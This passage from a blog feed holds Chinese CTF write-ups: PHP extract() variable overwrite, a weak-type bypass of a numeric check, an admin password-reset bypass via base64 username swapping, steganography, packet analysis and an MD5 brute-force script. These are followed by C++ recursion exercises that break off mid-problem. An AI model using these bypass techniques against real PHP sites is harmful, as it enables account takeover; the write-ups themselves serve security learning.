title="变量覆盖"></a>变量覆盖</h3><p>今天又学到了一点新知识，关于php里的变量覆盖问题<br>题目如下：<br><img src="https://s1.ax1x.com/2018/11/28/FVcFUO.png" alt=""><br>在底部给出了sourcecode，查看一波源码<br><img src="https://s1.ax1x.com/2018/11/28/FVcKqP.png" alt=""><br>发现存在extract()函数，应该就是这个函数的问题，extract函数的用处如下<br><img src="https://s1.ax1x.com/2018/11/28/FVcwZV.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extract() 函数从数组中将变量导入到当前的符号表。</span><br><span class="line">该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</span><br><span class="line">该函数返回成功设置的变量数目。</span><br></pre></td></tr></table></figure></p><p>会将对应的键值当做变量，并且将键对应的值赋值给这个变量，所以就存在原先已经赋过值的变量被重新赋值的现象。<br>这题的要求就是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pass==$thepassword_123</span><br></pre></td></tr></table></figure></p><p>题目要求是post，就直接传两个相等的值即可<br><img src="https://s1.ax1x.com/2018/11/28/FVgQyR.png" alt=""><br>结果如下：<br><img src="https://s1.ax1x.com/2018/11/28/FVgw6A.png" alt=""></p><h3 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h3><p>源码如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> noother_says_correct(<span class="variable">$number</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="variable">$one</span> = ord(<span class="string">'1'</span>);</span><br><span class="line">       <span class="variable">$nine</span> = ord(<span class="string">'9'</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++)</span><br><span class="line">       &#123;   </span><br><span class="line">               <span class="variable">$digit</span> = ord(<span class="variable">$number</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line">               <span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          <span class="built_in">return</span> <span class="variable">$number</span> == <span class="string">'54975581388'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct(<span class="variable">$_GET</span>[<span class="string">'key'</span>]))</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="built_in">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>大概就是扫描number这个字符串，发现数字就输出”access denied”,如果没有数字就输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $number == &apos;54975581388&apos;;</span><br></pre></td></tr></table></figure></p><p>根据以前的做题经验，大概又是php弱类型的绕过，绞尽脑汁都没有想出来应该怎么绕过这个数字，再贴一篇干货帖子：<a href="https://www.freebuf.com/articles/web/166543.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/166543.html</a><br>了解到可能是传一个十六进制数上去，解析以后和原来的数相等就可以了，但我心想怎么可能这么巧就是这个十六进制数不包含0-9的数呢，不管了，先试一试，十六进制转换以后果然不包含0-9的数字…wtf?(心中万头cn马奔腾)…<br>进制转换是ccccccccc，加上十六进制符号0xccccccccc即可<br><img src="https://s1.ax1x.com/2018/11/28/FVRNMd.png" alt=""></p><h3 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h3><p>查看网页源代码：<br><img src="https://s1.ax1x.com/2018/11/28/FVTTKO.png" alt=""><br>显示数据的提交方式都是POST方式,提交的数据有user/newpass/vcode这三项，都是要POST传参的，传递的数据如下所示：<br><img src="https://s1.ax1x.com/2018/11/28/FV7ldJ.png" alt=""><br><strong>传参构造的url需要注意，将ctfuser的base64编码值换成admin的编码值</strong>结果如下：<br><img src="https://s1.ax1x.com/2018/11/28/FV7Yz6.png" alt=""></p><h2 id="MISC题解"><a href="#MISC题解" class="headerlink" title="MISC题解"></a><strong>MISC题解</strong></h2><h3 id="丘比龙De女神"><a href="#丘比龙De女神" class="headerlink" title="丘比龙De女神"></a>丘比龙De女神</h3><p>这题拿到手是一个文件gif,改成gif后缀发现是一张gif图片，放到kali里跑一下发现确实有点猫腻，如下图：<br><img src="https://s1.ax1x.com/2018/11/11/iqxPjf.png" alt=""><br>发现了一个zip文件，于是返回将文件格式改为zip，得到一个压缩包，解压无果，果然没这么简单，丢进十六进制编辑器得到一个gif格式的文件头，搜索003B(gif文件尾)如下<br><img src="https://s1.ax1x.com/2018/11/11/iqxNCR.png" alt=""><br>发现后面还是有文件，另存，但是感觉这个love有点奇怪，算了，先记录一下，管他有没有用。。。<br><img src="https://s1.ax1x.com/2018/11/11/iqx0KK.png" alt=""><br>文件的14 00 01 00 08 00特别熟悉，就是zip文件的文件头的一部分，说做就做，把前面改成压缩包的文件头<br><img src="https://s1.ax1x.com/2018/11/11/iqxL2q.png" alt=""><br>解压发现需要密码，填入先前记录的love解压成功，得到一张女神图片(有点…瓜)<br><img src="https://s1.ax1x.com/2018/11/11/iqzpa4.png" alt=""><br>需要的是图片的MD5值，去kali用md5sum跑一下得到flag值<br><img src="https://s1.ax1x.com/2018/11/11/iqzoy6.png" alt=""></p><h3 id="Remove-Boyfriend"><a href="#Remove-Boyfriend" class="headerlink" title="Remove Boyfriend"></a>Remove Boyfriend</h3><p>流量包分析题，丢进wireshark，协议分级统计发现全部为TCP数据包<br><img src="https://s1.ax1x.com/2018/11/11/iLSCm8.png" alt=""><br>追踪TCP流，在2号流里发现有用信息<br><img src="https://s1.ax1x.com/2018/11/11/iLSEfs.png" alt=""><br>在3号流里发现flag.py源码研究发现是一个凯撒加密移位算法运行发现flag is not here，证明字符串s错误，需要找到正确的s<br><img src="https://s1.ax1x.com/2018/11/11/iLSd0O.png" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def Upper(ch):  </span><br><span class="line">    <span class="keyword">if</span> ch&gt;=<span class="string">'A'</span> and ch&lt;=<span class="string">'Z'</span>:  </span><br><span class="line">        <span class="built_in">return</span> True  </span><br><span class="line">  </span><br><span class="line">def Lower(ch):  </span><br><span class="line">    <span class="keyword">if</span> ch&gt;=<span class="string">'a'</span> and ch&lt;=<span class="string">'z'</span>:  </span><br><span class="line">        <span class="built_in">return</span> True  </span><br><span class="line">  </span><br><span class="line">def X1con(s):  </span><br><span class="line">    flag = <span class="string">''</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:  </span><br><span class="line">        <span class="keyword">if</span> Upper(i) == True:  </span><br><span class="line">            <span class="keyword">if</span> i&gt;=<span class="string">'A'</span> and i&lt;=<span class="string">'M'</span>:  </span><br><span class="line">                flag += chr(ord(i)+13)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                flag += chr(ord(i)-13)  </span><br><span class="line">        <span class="keyword">elif</span> Lower(i) == True:  </span><br><span class="line">            <span class="keyword">if</span> i&gt;=<span class="string">'a'</span> and i&lt;=<span class="string">'m'</span>:  </span><br><span class="line">                flag += chr(ord(i)+13)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                flag += chr(ord(i)-13)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            flag += i  </span><br><span class="line">    <span class="built_in">return</span> flag  </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:  </span><br><span class="line">    s = <span class="string">'&#123;synt_vf_abg_urer&#125;'</span>  </span><br><span class="line">    <span class="built_in">print</span> X1con(s)</span><br></pre></td></tr></table></figure></p><p>在6号流里发现有用信息，发现文件头为png，是图片没得跑<br><img src="https://s1.ax1x.com/2018/11/11/iLSy9A.png" alt=""><br><img src="https://s1.ax1x.com/2018/11/11/iLpZUe.png" alt=""><br>转为原始数据保存为png文件果然得到一张小姐姐的照片,在左下角发现字符串信息，提交试一下不行<br><img src="https://s1.ax1x.com/2018/11/11/iLpu8A.png" alt=""><br>将之前的py文件里的变量s改为这个字符串运行得到flag<br><img src="https://s1.ax1x.com/2018/11/11/iLpJUg.png" alt=""></p><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>这题给出一段MD5加密的部分明文和密文<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：e9032???da???08????911513?0???a2 </span><br><span class="line">明文：TASC?O3RJMV?WDJKX?ZM</span><br><span class="line">要求你还原出密文并且加上nctf&#123;&#125;提交</span><br></pre></td></tr></table></figure></p><p>网络安全课程上老师讲了口令破解的时候讲了暴力破解，新学了个比较有用的脚本可以专门用来爆破MD5口令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">str1=<span class="string">'TASC'</span></span><br><span class="line">str2=<span class="string">'O3RJMV'</span></span><br><span class="line">str3=<span class="string">'WDJKX'</span></span><br><span class="line">str4=<span class="string">'ZM'</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(32,126):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(32,126):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(32,126):</span><br><span class="line">            m=str1+chr(a)+str2+chr(b)+str3+chr(c)+str4</span><br><span class="line">            x=hashlib.md5(m).hexdigest()</span><br><span class="line">            <span class="keyword">if</span>(x[0:5]==<span class="string">'e9032'</span>):</span><br><span class="line">                <span class="built_in">print</span> x</span><br></pre></td></tr></table></figure></p><p>在ASCII码32~126之间对这三个缺失的明文字符进行穷举，由于MD5加密的不可逆性质，所以采用对比密文的方式检验，如果前五位和原来一<br>样就相当于找到了正确的明文，暴力破解得到密文串，加上nctf提交即可</p><h3 id="图种"><a href="#图种" class="headerlink" title="图种"></a>图种</h3><p>这题是一个简单的隐写题，给了一个gif格式的图片，话不多说直接丢进十六进制编辑器，搜索关键字504B0304得到一个PK文件头<br><img src="https://s1.ax1x.com/2018/11/13/iOTo1U.png" alt=""><br>将文件改为zip格式后解压即可再次得到一个gif图片，flag是图片最后一句话的首字母加上nctf提交即可<br><img src="https://s1.ax1x.com/2018/11/13/iOTL7R.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;给自己一个备忘录，记录学习过程
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>递归与分治</title>
    <link href="https://gardenia30.top/2018/11/08/%E9%80%92%E5%BD%92%E4%B8%8E%E5%88%86%E6%B2%BB/"/>
    <id>https://gardenia30.top/2018/11/08/递归与分治/</id>
    <published>2018-11-08T14:01:42.000Z</published>
    <updated>2018-12-22T11:32:15.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>递归到天荒地老<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a><strong>正文</strong></h1><h2 id="递归过程摸索"><a href="#递归过程摸索" class="headerlink" title="递归过程摸索"></a><strong>递归过程摸索</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int fun(int n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n &gt; 5)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">"leval 1th-n"</span> &lt;&lt;<span class="string">" "</span>&lt;&lt;n &lt;&lt; endl;</span><br><span class="line">int result = fun(n + 1);</span><br><span class="line">cout&lt;&lt; <span class="string">"leval 2th-n"</span> &lt;&lt; <span class="string">" "</span> &lt;&lt; n &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">"leval 2th-result"</span> &lt;&lt; <span class="string">" "</span> &lt;&lt; result &lt;&lt; endl;</span><br><span class="line"><span class="built_in">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int key = fun(0);</span><br><span class="line">cout &lt;&lt; <span class="string">"main key"</span> &lt;&lt; <span class="string">" "</span> &lt;&lt; key &lt;&lt; endl;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="青蛙跳台阶"><a href="#青蛙跳台阶" class="headerlink" title="青蛙跳台阶"></a><strong>青蛙跳台阶</strong></h2><p><strong>题目描述</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line">多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100)</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量.</span><br><span class="line">所得到的结果模1000000007</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure></p><p><strong>解题思路</strong><br>斐波那契数列，此题递归时间太长，不推荐，最好的方法是迭代<br><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">unsigned long long fab(unsigned int num)</span><br><span class="line">&#123;</span><br><span class="line">unsigned long long a = 1000000007;</span><br><span class="line">unsigned long long form1 = 1;</span><br><span class="line">unsigned long long form2 = 2;</span><br><span class="line">unsigned long long target = 0;</span><br><span class="line"><span class="keyword">if</span> (num == 1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (num == 2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span> 2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (int i = 3; i &lt;= num; i++)</span><br><span class="line">&#123;</span><br><span class="line">target=((form1%a)+(form2%a))%a;</span><br><span class="line">form1=form2;</span><br><span class="line">form2=target;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> target;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">unsigned int n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt;fab(n)&lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="排列问题"><a href="#排列问题" class="headerlink" title="排列问题"></a><strong>排列问题</strong></h2><p><strong>题目描述</strong><br>要求输入一个字符串，输出他的全排列<br><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">char list[2000];</span><br><span class="line">void swap(int a,int b) </span><br><span class="line">&#123;</span><br><span class="line">int temp=a;</span><br><span class="line">a=b;</span><br><span class="line">b=temp;</span><br><span class="line">&#125;</span><br><span class="line">void perm(int k,int m)//输出list数组从k到m位的全排列</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">if</span>(k==m)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;=m;i++)cout&lt;&lt;list[i];</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line"><span class="built_in">return</span>;</span><br><span class="line">&#125;//递归到k=m为止结束递归</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int i=k;i&lt;=m;i++)</span><br><span class="line">&#123;</span><br><span class="line">swap(list[k],list[i]);</span><br><span class="line">perm(k+1,m);</span><br><span class="line">swap(list[k],list[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(cin&gt;&gt;list)</span><br><span class="line">&#123;</span><br><span class="line">int len=strlen(list);</span><br><span class="line">perm(0,len-1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="汽水瓶"><a href="#汽水瓶" class="headerlink" title="汽水瓶"></a><strong>汽水瓶</strong></h2><p><strong>题目描述</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line">输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line">3</span><br><span class="line">10</span><br><span class="line">81</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line">1</span><br><span class="line">5</span><br><span class="line">40</span><br></pre></td></tr></table></figure></p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int bottle(int n)</span><br><span class="line">&#123;</span><br><span class="line">int count=0;</span><br><span class="line"><span class="keyword">while</span>(n&gt;=3)</span><br><span class="line">&#123;</span><br><span class="line">int form1=n/3;</span><br><span class="line">int form2=n%3;</span><br><span class="line">n=form1+form2;</span><br><span class="line">count+=form1;</span><br><span class="line"><span class="keyword">if</span>(n==2)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int N;</span><br><span class="line"><span class="keyword">while</span>(cin&gt;&gt;N&amp;&amp;N!=0)</span><br><span class="line">&#123;</span><br><span class="line">int ans=bottle(N);</span><br><span class="line">cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a><strong>进制转换</strong></h2><p><strong>题目描述</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> 输入一个十进制正整数，然后输出它所对应的八进制数。</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line">输入一个十进制正整数n(1≤n≤106) 。</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">输出n对应的八进制数，输出在一行。</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line">10</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line">12</span><br></pre></td></tr></table></figure></p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int form(int num)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num &lt;8)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span> num % 8 + 10 * form(num / 8);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a,b;</span><br><span class="line">cin &gt;&gt; a;</span><br><span class="line">b = form(a);</span><br><span class="line">cout &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a><strong>二分法</strong></h2><p><strong>题目描述</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">在金融中，我们有时会用内部收益率IRR来评价项目的投资财务效益，它等于使得投资净现值NPV等于0的贴现率。换句话说，给定项目的期数T、初始现金流CF0和项目各期的现金流CF1, CF2, ...，CFT，IRR是下面方程的解：</span><br><span class="line"></span><br><span class="line">为了简单起见，本题假定：除了项目启动时有一笔投入（即初始现金流CF0 &lt; 0）之外，其余各期均能赚钱（即对于所有i=1,2,...,T，CFi &gt; 0）。根据定义，IRR可以是负数，但不能大于-1。</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line"></span><br><span class="line">输入文件最多包含25组测试数据，每个数据占两行，第一行包含一个正整数T（1&lt;=T&lt;=10），表示项目的期数。第二行包含T+1个整数：CF0, CF1, CF2, ..., CFT，其中CF0 &lt; 0, 0 &lt; CFi &lt; 10000 